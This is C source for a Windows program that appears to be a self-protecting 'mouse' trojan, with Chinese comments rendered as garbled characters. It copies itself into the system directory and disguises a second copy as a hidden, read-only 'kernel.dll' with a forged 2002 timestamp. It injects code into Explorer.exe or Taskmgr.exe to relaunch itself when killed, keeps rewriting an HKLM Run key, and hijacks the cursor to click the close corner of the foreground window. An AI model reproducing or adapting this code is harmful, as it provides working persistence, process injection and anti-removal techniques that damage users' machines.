#define UNICODE 
#define _UNICODE 

#include <windows.h> 
#include <tchar.h> 
#include <Tlhelp32.h>
#include <stdio.h>

typedef struct _remoteparameter
{
	DWORD       rpoutputdebugstring;
	DWORD       rpopenprocess;
	DWORD       rpwaitforsingleobject;
	DWORD       rpfindfirstfile;
	DWORD       rpcopyfile;
	DWORD       rpfindclose;
	DWORD       rpwinexec;
	DWORD		rpgetlasterror;

	DWORD       rpmousepid;
	HANDLE      rpprocesshandle;
	HANDLE      rpfilehandle;
	char       rptname[MAX_PATH];
	char       rpkname[MAX_PATH];
	char        rpwinexecname[MAX_PATH];
	WIN32_FIND_DATA rpfdata;

	char       rpoperror[30];
	char       rpffferror[30];
	char       rpcferror[30];
	char       rpfcerror[30];
	char       rpweerror[30];
	char       rpstring[30];
	char       rpwfsosignal[30];

}REMOTEPARAMETER, *PREMOTEPARAMETER;

DWORD   WINAPI remote(LPVOID pvparam);
DWORD   WINAPI watch(LPVOID pvparam);

DWORD  GetProcessID(TCHAR *szProcessName);
HANDLE  createremote(char*, char*);


HANDLE wthread;
char  *name1 = "\\T-mouse.exe";
char  *name2 = "\\kernel.dll";
BOOL enableDebugPriv()
{
	HANDLE  hToken;
	LUID    sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)
		)
	{
		return false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		CloseHandle(hToken);
		return false;
	}
	return true;
}
int main()
{
	enableDebugPriv();
	LPWIN32_FIND_DATAA    fdata=NULL;
	HANDLE            ffhandle;
	HANDLE            fchandle;
	SYSTEMTIME        stime;
	FILETIME          ftime;
	char             syspath[MAX_PATH];
	char             curname[MAX_PATH];
	char             tname[MAX_PATH];
	char             kname[MAX_PATH];
	int               ret;

	HANDLE            rthread;

	HWND              hwnd;
	RECT              rt;
	POINT             ptnew;
	TCHAR             title[250];


	//��ȡϵͳĿ¼
	ret = GetSystemDirectoryA(syspath, MAX_PATH);
	if (ret == 0)
	{
		printf("GetSystemDirectory Error: %d\n", GetLastError());
		getchar();
		return -1;
	}
	strcpy_s(tname, syspath);
	strcat_s(tname, name1);
	strcpy_s(kname, syspath);
	strcat_s(kname, name2);
	//Ѱ��ϵͳĿ¼����û��T-mouse.exe
	
	ffhandle = FindFirstFileA(tname, fdata);
	if (ffhandle == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == 2)
		{
			ret = GetCurrentDirectoryA(MAX_PATH, curname);
			if (ret == 0)
			{
				printf("GetCurrentDirectory Error: %d\n", GetLastError());
				getchar();
				return -1;
			}
			strcat_s(curname, name1);
			//���ϵͳĿ¼��û�У��ڽ��������еĳ����Ƶ�ϵͳĿ¼��
			if (!CopyFileA(curname, tname, false))
			{
				printf("CopyFile %s:%s Error: %d\n", curname, tname, GetLastError());
				getchar();
				return -1;
			}
		}
		else
		{
			printf("FindFirstFile %s Error: %d\n", tname, GetLastError());
			getchar();
			return -1;
		}
	}
	else if (!FindClose(ffhandle))
	{
		printf("FindClose %s Error: %d\n", tname, GetLastError());
		getchar();
		return -1;
	}
	//Ѱ��ϵͳĿ¼�µ�kernel.dll
	ffhandle = FindFirstFileA(kname, fdata);
	if (ffhandle == INVALID_HANDLE_VALUE)
	{
		//����Ҳ���ϵͳָ���ļ�
		if (GetLastError() == 2)
		{
			ret = GetCurrentDirectoryA(MAX_PATH, curname);
			if (ret == 0)
			{
				printf("GetCurrentDirectory Error: %d\n", GetLastError());
				getchar();
				return -1;
			}
			strcat_s(curname, name1);
			//�����ļ�kernel.dll��ϵͳĿ¼
			if (!CopyFileA(curname, kname, TRUE))
			{
				printf("CopyFile %s Error: %d\n", kname, GetLastError());
				getchar();
				return -1;
			}

			//��kernel.dll
			fchandle = CreateFileA(kname, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (fchandle == INVALID_HANDLE_VALUE)
			{
				printf("CreateFile %s Error: %d\n", kname, GetLastError());
				getchar();
				return -1;
			}

			memset(&stime, 0, sizeof(stime));
			stime.wYear = 2002;
			stime.wMonth = 1;
			stime.wDay = 12;
			stime.wDayOfWeek = 5;
			stime.wHour = 1;
			if (!SystemTimeToFileTime(&stime, &ftime))
			{
				printf("SystemTimeToFileTime Error: %d\n", GetLastError());
				CloseHandle(fchandle);
				getchar();
				return -1;
			}
			//�޸�kernel.dll�Ĵ���ʱ����޸�ʱ��
			if (!SetFileTime(fchandle, &ftime, NULL, &ftime))
			{
				printf("SetFileTime Error: %d\n", GetLastError());
				CloseHandle(fchandle);
				getchar();
				return -1;
			}
			//�����ļ�����ֻ��������
			if (!SetFileAttributesA(kname, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM))
			{
				printf("SetFileAttributes Error: %d\n", GetLastError());
				CloseHandle(fchandle);
				getchar();
				return -1;
			}
			CloseHandle(fchandle);
		}
		else
		{
			printf("FindFirstFile %s Error: %d\n", kname, GetLastError());
			getchar();
			return -1;
		}
	}
	else if (!FindClose(ffhandle))
	{
		printf("FindClose %s Error: %d\n", kname, GetLastError());
		getchar();
		return -1;
	}

	if ((rthread = createremote(tname, kname)) == NULL)
	{
		printf("CreateRemote Error\n");
		getchar();
		return -1;
	}
	//����פ�����������ڵĸ��������̣߳�����CreateRemoteThread�����ķ��ؾ������watch����
	wthread = CreateThread(NULL, 0, watch, (LPVOID)rthread, 0, NULL);
	if (wthread == NULL)
	{
		printf("CreateThread Error: %d\n", GetLastError());
		CloseHandle(rthread);
		getchar();
		return -1;
	}

	while (1)
	{
		hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rt);
		GetCursorPos(&ptnew);

		if (ptnew.x<rt.right - 15)
			ptnew.x += 3;
		else if (ptnew.x>rt.right - 12)
			ptnew.x -= 3;

		if (ptnew.y<rt.top + 12)
			ptnew.y += 3;
		else if (ptnew.y>rt.top + 15)
			ptnew.y -= 3;
		SetCursorPos(ptnew.x, ptnew.y);

		if ((ptnew.x >= rt.right - 15) && (ptnew.x <= rt.right - 12)
			&& (ptnew.y >= rt.top + 12) && (ptnew.y <= rt.top + 15)
			&& (_tcslen(title) != 0))
		{
			mouse_event(MOUSEEVENTF_LEFTDOWN, ptnew.x, ptnew.y, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTUP, ptnew.x, ptnew.y, 0, 0);
		}

		Sleep(1);
	}
	getchar();
	return 0;
}

DWORD GetProcessID(TCHAR *szProcessName)
{
	//PROCESSENTRY32�������<Tlhelp32.h>��
	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	//�����߳̿���
	HANDLE SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (SnapshotHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	if (!Process32First(SnapshotHandle, &pe32))
	{
		return 0;
	}

	do
	{
		if (!_tcsicmp(szProcessName, pe32.szExeFile))
		{
			printf("%s��PID��:%d\n", pe32.szExeFile, pe32.th32ProcessID);
			return pe32.th32ProcessID;
		}
		//Process32Next��һ�����̻�ȡ���������������ú���CreateToolhelp32Snapshot()��õ�ǰ���н��̵Ŀ��պ�, ���ǿ�������Process32Next�����������һ�����̵ľ��
	} while (Process32Next(SnapshotHandle, &pe32));

	return 0;
}
HANDLE createremote(char * ctname, char * ckname)
{
	HANDLE            ethread;
	HANDLE            rphandle;
	TCHAR             name[2][15];
	PVOID             remotethr;
	PVOID             remotepar;
	DWORD             remotepid;
	int               cb;
	int               signal;
	HINSTANCE         hkernel32;
	REMOTEPARAMETER   rp;

	_tcscpy_s(name[0], _T("Explorer.exe"));
	_tcscpy_s(name[1], _T("Taskmgr.exe"));
	signal = 1;
	while (1)
	{
		//��ȡ����ID
		remotepid = GetProcessID(name[(++signal) % 2]);
		if (remotepid == -1)
		{
			printf("GetProcessID Error: %d\n", GetLastError());
			getchar();
			return NULL;
		}
		else if (remotepid == 0)
		{
			OutputDebugString(_T("Remote Process isn't running\n"));
			Sleep(1000);
			continue;
		}
		rphandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, remotepid);
		if (rphandle == NULL)
		{
			printf("OpenProcess Error: %d\n", GetLastError());
			getchar();
			Sleep(1000);
			continue;
		}
		else
		{
			break;
		}
	}

	cb = sizeof(char)* 4 * 1024*5;
	//ΪԶ��ע��ĺ�������ռ�
	remotethr = VirtualAllocEx(rphandle, NULL, cb, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remotethr == NULL)
	{
		printf("VirtualAllocEx for Thread Error: %d\n", GetLastError());
		CloseHandle(rphandle);
		getchar();
		return NULL;
	}
	//����������д�����ĵ�ַ�ռ�
	if (WriteProcessMemory(rphandle, remotethr, (LPVOID)remote, cb, NULL) == FALSE)
	{
		printf("WriteProcessMemory for Thread Error: %d\n", GetLastError());
		CloseHandle(rphandle);
		getchar();
		return NULL;
	}
	
	{
		//��REMOTEPARAMETER�ṹ���г�ʼ��
		memset(&rp, 0, sizeof(rp));
		rp.rpmousepid = GetCurrentProcessId();
		strcpy_s(rp.rpstring, "i am in remote process\n");
		strcpy_s(rp.rpcferror, "CopyFile Error\n");
		strcpy_s(rp.rpfcerror, "FindClose Error\n");
		strcpy_s(rp.rpffferror, "FindFirstFile Error\n");
		strcpy_s(rp.rpoperror, "OpenProcess Error\n");
		strcpy_s(rp.rpweerror, "WinExec Error\n");
		strcpy_s(rp.rpwfsosignal, "i am out of remote process\n");
		strcpy_s(rp.rptname, ctname);
		strcpy_s(rp.rpkname, ckname);
		strcpy_s(rp.rpwinexecname, ctname);
		hkernel32 = GetModuleHandleA("kernel32.dll");
		rp.rpoutputdebugstring = (DWORD)GetProcAddress(hkernel32, "OutputDebugStringA");
		rp.rpopenprocess = (DWORD)GetProcAddress(hkernel32, "OpenProcess");
		rp.rpwaitforsingleobject = (DWORD)GetProcAddress(hkernel32, "WaitForSingleObject");
		rp.rpfindfirstfile = (DWORD)GetProcAddress(hkernel32, "FindFirstFileA");
		rp.rpcopyfile = (DWORD)GetProcAddress(hkernel32, "CopyFileA");
		rp.rpfindclose = (DWORD)GetProcAddress(hkernel32, "FindClose");
		rp.rpwinexec = (DWORD)GetProcAddress(hkernel32, "WinExec");
		rp.rpgetlasterror = (DWORD)GetProcAddress(hkernel32, "GetLastError");
	}
	cb = sizeof(rp);
	//Ϊ������������ռ�
	remotepar = VirtualAllocEx(rphandle, NULL, cb, MEM_COMMIT, PAGE_READWRITE);
	if (remotepar == NULL)
	{
		printf("VirtualAllocEx for Parameter Error: %d\n", GetLastError());
		CloseHandle(rphandle);
		getchar();
		return NULL;
	}
	//����������д�������ڴ�ռ�
	if (WriteProcessMemory(rphandle, remotepar, (LPVOID)&rp, cb, NULL) == FALSE)
	{
		printf("WriteProcessMemory for Parameter Error: %d\n", GetLastError());
		CloseHandle(rphandle);
		getchar();
		return NULL;
	}
	//����Զ�̼����߳� 
	ethread = CreateRemoteThread(rphandle, NULL, 0, (LPTHREAD_START_ROUTINE)remotethr, (LPVOID)remotepar, 0, NULL);
	if (ethread == NULL)
	{
		printf("CreateRemoteThread Error: %d\n", GetLastError());
		CloseHandle(rphandle);
		getchar();
		return NULL;
	}
	CloseHandle(rphandle);
	return ethread;
}


DWORD WINAPI watch(LPVOID pvparam)
{
	HANDLE            wethread = (HANDLE)pvparam;
	DWORD             exitcode;

	HKEY              hkey;
	char             sname[MAX_PATH];
	char             wtname[MAX_PATH];
	char             wkname[MAX_PATH];
	char             lpdata[MAX_PATH];
	LPCTSTR           rgspath = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
	DWORD             type = REG_SZ;
	DWORD             dwbuflen = MAX_PATH;
	int               ret;

	if ((ret = GetSystemDirectoryA(sname, MAX_PATH)) == 0)
	{
		printf("GetSystemDirectory in watch Error: %d\n", GetLastError());
		getchar();
		return -1;
	}
	strcpy_s(wtname, sname);
	strcat_s(wtname, name1);
	strcpy_s(wkname, sname);
	strcat_s(wkname, name2);

	while (1)
	{
		//��ѭ���ж�ע����Ƿ����T-mouse�ļ�ֵ
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, rgspath, 0, KEY_QUERY_VALUE, &hkey);
		if (ret != ERROR_SUCCESS)
		{
			printf("RegOpenKeyEx for KEY_QUERY_VALUE Error: %d\n", GetLastError());
			getchar();
			break;
		}
		ret = RegQueryValueEx(hkey, _T("T-mouse"), NULL, NULL, (LPBYTE)lpdata, &dwbuflen);
		RegCloseKey(hkey);
		if (ret != ERROR_SUCCESS)
		{
			ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, rgspath, 0, KEY_WRITE, &hkey);
			if (ret != ERROR_SUCCESS)
			{
				printf("RegOpenKeyEx for KEY_WRITE Error: %d\n", GetLastError());
				getchar();
				break;
			}
			ret = RegSetValueEx(hkey, _T("T-mouse"), NULL, type, (const byte *)wtname, dwbuflen);
			RegCloseKey(hkey);
			if (ret != ERROR_SUCCESS)
			{
				printf("RegSetValueEx Error: %d\n", GetLastError());
				getchar();
				break;
			}
		}
		//�ж�Զ���̵߳�ִ��������������STILL_ACTIVE״̬������Զ���߳�
		GetExitCodeThread(wethread, &exitcode);
		if (exitcode != STILL_ACTIVE)
		{
			wethread = createremote(wtname, wkname);
		}
		Sleep(1000);
	}
	return 0;
}

//Զ���̺߳���
DWORD WINAPI remote(LPVOID pvparam)
{
	PREMOTEPARAMETER erp = (PREMOTEPARAMETER)pvparam;
	//��Щ�����ĵ�ַ�������ⲿ�������룬��Ϊ��������������Ҫ�ض���
	typedef VOID(WINAPI *EOutputDebugStringA)(LPCSTR);
	typedef HANDLE(WINAPI *EOpenProcess)(DWORD, BOOL, DWORD);
	typedef DWORD(WINAPI *EWaitForSingleObject)(HANDLE, DWORD);
	typedef HANDLE(WINAPI *EFindFirstFileA)(LPCSTR, LPWIN32_FIND_DATA);
	typedef BOOL(WINAPI *ECopyFileA)(LPCSTR, LPCSTR, BOOL);
	typedef BOOL(WINAPI *EFindClose)(HANDLE);
	typedef UINT(WINAPI *EWinExec)(LPCSTR, UINT);
	typedef DWORD(WINAPI *EGetLastError)(VOID);
	EOutputDebugStringA   tOutputDebugString;
	EOpenProcess         tOpenProcess;
	EWaitForSingleObject tWaitForSingleObject;
	EFindFirstFileA       tFindFirstFile;
	ECopyFileA            tCopyFile;
	EFindClose           tFindClose;
	EWinExec             tWinExec;
	EGetLastError		tGetLastError;
	tOutputDebugString = (EOutputDebugStringA)erp->rpoutputdebugstring;
	tOpenProcess = (EOpenProcess)erp->rpopenprocess;
	tWaitForSingleObject = (EWaitForSingleObject)erp->rpwaitforsingleobject;
	tFindFirstFile = (EFindFirstFileA)erp->rpfindfirstfile;
	tCopyFile = (ECopyFileA)erp->rpcopyfile;
	tFindClose = (EFindClose)erp->rpfindclose;
	tWinExec = (EWinExec)erp->rpwinexec;
	tGetLastError = (EGetLastError)erp->rpgetlasterror;
	tOutputDebugString(erp->rpstring);
	//Զ���̺߳���������������һֱ�����ǵĲ�������
	erp->rpprocesshandle = tOpenProcess(PROCESS_ALL_ACCESS, FALSE, erp->rpmousepid);
	if (erp->rpprocesshandle == NULL)
	{
		tOutputDebugString((LPCSTR)tGetLastError());
		return -1;
	}
	tWaitForSingleObject(erp->rpprocesshandle, INFINITE);
	tOutputDebugString(erp->rpwfsosignal);
	//Ѱ�Ҳ����Ƿ�ɾ��
	erp->rpfilehandle = tFindFirstFile(erp->rptname, &erp->rpfdata);
	if (erp->rpfilehandle == INVALID_HANDLE_VALUE)
	{
		tOutputDebugString(erp->rpffferror);
		//�����ɾ���ٸ��ƹ�ȥ
		if (!tCopyFile(erp->rpkname, erp->rptname, TRUE))
		{
			tOutputDebugString(erp->rpcferror);
			return -1;
		}
	}
	if (!tFindClose(erp->rpfilehandle))
	{
		tOutputDebugString(erp->rpfcerror );
		return -1;
	}
	//������֮�����в�������
	if (tWinExec(erp->rpwinexecname, 0) <= 31)
	{
		tOutputDebugString(erp->rpweerror);
		return -1;
	}
	return 0;
}